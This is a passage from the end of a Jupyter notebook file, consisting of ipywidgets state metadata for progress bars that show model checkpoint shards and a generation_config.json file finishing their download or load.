            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_65f68fb0a7724c588366bda0e4d53c71",
            "placeholder": "​",
            "style": "IPY_MODEL_4035534dc9ad4e3db88c06473dc31cf9",
            "value": "Loading checkpoint shards: 100%"
          }
        },
        "507123fc2446446f8036b352f3b4daa8": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_7251a2f6727d468699d05aaa8f4afb6f",
            "max": 4,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_d6730e58c2934dae9aed4826c292b089",
            "value": 4
          }
        },
        "ff78da02a8174d6f8853e72720579da3": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_af1eb737b53c44dc85a21b67ca532930",
            "placeholder": "​",
            "style": "IPY_MODEL_184ca6caa03b487c972e1fc7553a273a",
            "value": " 4/4 [00:14&lt;00:00,  3.27s/it]"
          }
        },
        "3d29d415223140e1a15c166f06d09c8c": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "65f68fb0a7724c588366bda0e4d53c71": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "4035534dc9ad4e3db88c06473dc31cf9": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "7251a2f6727d468699d05aaa8f4afb6f": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "d6730e58c2934dae9aed4826c292b089": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "af1eb737b53c44dc85a21b67ca532930": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "184ca6caa03b487c972e1fc7553a273a": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "e3a0560c90f54e81989badbd5250f448": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_d7e4e667f5f845889393357dcc13ae8b",
              "IPY_MODEL_b54537fd46e34064815301870e562516",
              "IPY_MODEL_12e11d8794844c5ab41eaac773c6e123"
            ],
            "layout": "IPY_MODEL_28e4a9f606be413a99f4cff894e750a0"
          }
        },
        "d7e4e667f5f845889393357dcc13ae8b": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_b830c89f4de642d3ac0715b2d5c776e1",
            "placeholder": "​",
            "style": "IPY_MODEL_37b88d65af1943ebbcfc3142a19c8926",
            "value": "generation_config.json: 100%"
          }
        },
        "b54537fd46e34064815301870e562516": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_8a404e3cc2f041e6aa35251c868da2bd",
            "max": 237,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_c82208c24e314cb888a14a06ff25b8aa",
            "value": 237
          }
        },
        "12e11d8794844c5ab41eaac773c6e123": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_f85481ca6e99401ab58941b87b02b680",
            "placeholder": "​",
            "style": "IPY_MODEL_9a6ec1b3925e4ac4a2313301d4ee792e",
            "value": " 237/237 [00:00&lt;00:00, 30.8kB/s]"
          }
        },
        "28e4a9f606be413a99f4cff894e750a0": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "b830c89f4de642d3ac0715b2d5c776e1": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "37b88d65af1943ebbcfc3142a19c8926": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "8a404e3cc2f041e6aa35251c868da2bd": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "c82208c24e314cb888a14a06ff25b8aa": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "f85481ca6e99401ab58941b87b02b680": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "9a6ec1b3925e4ac4a2313301d4ee792e": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        }
      }
    }
  },
  "nbformat": 4,
  "nbformat_minor": 5
}